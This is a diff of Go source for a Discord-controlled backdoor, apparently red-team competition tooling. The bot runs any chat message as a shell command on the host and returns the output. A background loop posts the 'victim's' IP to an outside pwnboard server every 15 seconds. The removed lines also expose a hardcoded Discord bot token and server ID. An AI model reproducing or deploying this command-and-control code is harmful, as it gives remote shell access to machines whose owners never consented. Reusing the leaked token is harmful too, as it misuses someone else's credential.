@@ -12,7 +12,7 @@ import (
 	"strings"
 	"time"
 	"encoding/json"
-	// "gopkg.in/yaml.v3"
+	"gopkg.in/yaml.v3"
 	"github.com/andersfylling/disgord"
 	creator "./discord"
 )
@@ -59,14 +59,13 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 		// Problem is it is sending/receive the command globally <-------------Think of a way
 		if msg.Content == "ping" {
 			msg.Reply(evt.Ctx, s, "I am alive. Thank you")
-		}else if msg.Content == "die"{ //TODO: Still stop all program, we don't want that
+		}else if msg.Content == "die"{ 
 			// Delete Channel
 			s.DeleteChannel(con, msg.ChannelID)
 			os.Exit(0)
 		}else if msg.Content == "install" {
 			//Install stuff based on OS <-------------TODO
 		}else{
-			// fmt.Println("INPUT COMMAND")
 			//run os command and send results
 			output := shellRun(msg.Content)
 			if output == ""{
@@ -113,15 +112,13 @@ func shellRun(cmd string) string{
 }
 
 // updatepwnBoard sends a post request to pwnboard with the IP
-// Request is done every 7 seconds
+// Request is done every 15 seconds
 // ip: Victim's IP
 func updatepwnBoard(ip string){
 	for {
-
-		time.Sleep(25 * time.Second)
+		time.Sleep(15 * time.Second)
 
 		url := "http://pwnboard.win/generic"
-		// url := "http://localhost:8080"
 
      	// Create the struct
      	data := PwnBoard{
@@ -132,14 +129,12 @@ func updatepwnBoard(ip string){
     	// Marshal the data
     	sendit, err := json.Marshal(data)
     	if err != nil {
-        	//fmt.Println("\n[-] ERROR SENDING POST:", err)
         	return
     	}
 
     	// Send the post to pwnboard
     	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
     	if err != nil {
-        	//fmt.Println("[-] ERROR SENDING POST:", err)
         	return
     	}
 
@@ -179,37 +174,28 @@ func prettyOutput(out string) string {
 // Also updates pwnboard every 7 seconds because why not
 func main(){
 	// Config file
+	f, err := os.Open("config.yaml")
+	if err != nil {
+		processError(err)
+	}
+	defer f.Close()
 
-	token := "NzAyODc0Mzc5ODI2MjMzNDY0.XqJdpw.0kDsBSL0GmrX4PL6cJgXHltwTEc"
-	server := 702873874127388772
-	categoryname := "web"
-  	channelname := "web-team"
-	// f, err := os.Open("config.yaml")
-	// if err != nil {
-	// 	processError(err)
-	// }
-	// defer f.Close()
-
-	// var config Config
-	// decoder := yaml.NewDecoder(f)
-	// err = decoder.Decode(&config)
-	// if err != nil {
-	//     processError(err)
-	// }
-
-	// client := disgord.New(disgord.Config{
-	// 	BotToken: config.Discord.Token,
-	// })
+	var config Config
+	decoder := yaml.NewDecoder(f)
+	err = decoder.Decode(&config)
+	if err != nil {
+	    processError(err)
+	}
 
 	client := disgord.New(disgord.Config{
-		BotToken: token,
+		BotToken: config.Discord.Token,
 	})
 
 	glocli = client
 
-	id := server
-	categoryName := categoryname
-	channelName := channelname
+	id := config.Discord.ID
+ 	categoryName := config.Channel.OS
+ 	channelName := config.Channel.TeamNum
 
 	// Pwnboard test
 	go updatepwnBoard(getIP()) // <-----------------------Pwnboard stuff
